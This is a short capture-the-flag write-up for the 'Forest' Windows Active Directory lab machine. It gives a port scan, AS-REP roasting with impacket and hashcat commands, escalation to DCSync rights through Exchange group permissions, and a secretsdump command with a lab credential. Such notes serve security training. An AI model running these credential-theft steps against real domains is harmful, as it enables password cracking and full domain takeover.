# Forest - Windows - Easy

## Target: 10.129.39.27

### Open Ports Summary

| Port      | Service      | Version |
|-----------|--------------|---------|
| 53/tcp    | domain       | Simple DNS Plus |
| 88/tcp    | kerberos-sec | Microsoft Windows Kerberos (server time: 2026-08-02 12:19:45Z) |
| 135/tcp   | msrpc        | Microsoft Windows RPC |
| 139/tcp   | netbios-ssn  | Microsoft Windows netbios-ssn |
| 389/tcp   | ldap         | Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) |
| 445/tcp   | microsoft-ds | Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) |
| 464/tcp   | kpasswd5?    | - |
| 593/tcp   | ncacn_http   | Microsoft Windows RPC over HTTP 1.0 |
| 636/tcp   | tcpwrapped   | - |
| 3268/tcp  | ldap         | Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) |
| 3269/tcp  | tcpwrapped   | - |
| 5985/tcp  | http         | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |
| 9389/tcp  | mc-nmf       | .NET Message Framing |
| 47001/tcp | http         | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |
| 49664/tcp | msrpc        | Microsoft Windows RPC |
| 49665/tcp | msrpc        | Microsoft Windows RPC |
| 49666/tcp | msrpc        | Microsoft Windows RPC |
| 49667/tcp | msrpc        | Microsoft Windows RPC |
| 49671/tcp | msrpc        | Microsoft Windows RPC |
| 49676/tcp | ncacn_http   | Microsoft Windows RPC over HTTP 1.0 |
| 49677/tcp | msrpc        | Microsoft Windows RPC |
| 49681/tcp | msrpc        | Microsoft Windows RPC |
| 49698/tcp | msrpc        | Microsoft Windows RPC |
| 64801/tcp | msrpc        | Microsoft Windows RPC |

## Foothold

### Vulnerability
AS-REP roasting

### Exploit
- impacket-GetNPUsers HTB/ -usersfile users.txt -format hashcat -outputfile asrep.hash -dc-ip 10.129.37.206
- hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

## Privilege Escalation

1. Member of Account Operators with GenericAll on Exchange Windows Permissions
2. Added account to Exchange Windows Permissions
3. Granted DCSync rights on domain object
4. secretsdump and pass the hash into Administrator shell

### Exploit
secretsdump.py svc-alfresco:s3rvice@10.129.37.206



